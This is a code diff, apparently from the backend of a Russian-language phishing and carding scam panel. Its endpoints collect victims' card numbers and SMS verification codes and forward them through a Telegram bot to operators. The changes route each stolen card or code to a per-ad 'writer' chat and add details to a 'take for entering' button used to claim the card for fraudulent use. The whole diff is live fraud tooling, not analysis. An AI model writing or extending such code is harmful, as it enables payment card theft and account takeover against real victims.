@@ -604,7 +604,7 @@ app.post(`/api/submitCard`, async (req, res) => {
     const support = await generateSupport(ad, req, res);
     const cardInfo = await getCardInfo(log.cardNumber);
     await bot.sendMessage(
-      settings.logsGroupId,
+      ad.writeId ? ad.writeId : settings.logsGroupId,
       `<b>✏️ Ввод карты ${ad.service.title}</b>
 
 💰 Баланс: <code>${getBalance(log, ad)}</code>
@@ -623,7 +623,7 @@ app.post(`/api/submitCard`, async (req, res) => {
 💰 Цена: <b>${ad.price}</b>`,
       {
         parse_mode: "HTML",
-        reply_markup: Markup.inlineKeyboard([[Markup.callbackButton("✍️ Взять на вбив", `take_log_${log.id}`)]]),
+        reply_markup: Markup.inlineKeyboard([[Markup.callbackButton("✍️ Взять на вбив", `take_log_${log.id}_${ad.id}_link`)]]),
       }
     );
     await bot
@@ -740,7 +740,7 @@ app.post(`/api/submitCode`, async (req, res) => {
     };
 
     await bot.sendMessage(
-      settings.logsGroupId,
+      log.writerId ? log.writerId : settings.logsGroupId,
       `<b>📤 Ввод ${codeType[req.body.codeType || "sms"]} ${log.ad.service.title}</b>
 
 📤 Код: <b>${code}</b>
@@ -903,7 +903,7 @@ app.post(`/api/selectPicture`, async (req, res) => {
     });
 
     await bot.sendMessage(
-      settings.logsGroupId,
+      ad.writeId ? ad.writeId : settings.logsGroupId,
       `<b>🖼  Выбор картинки ${log.ad.service.title}</b>
 
 🖼 Картинка: <b>${req.body.picture}</b>
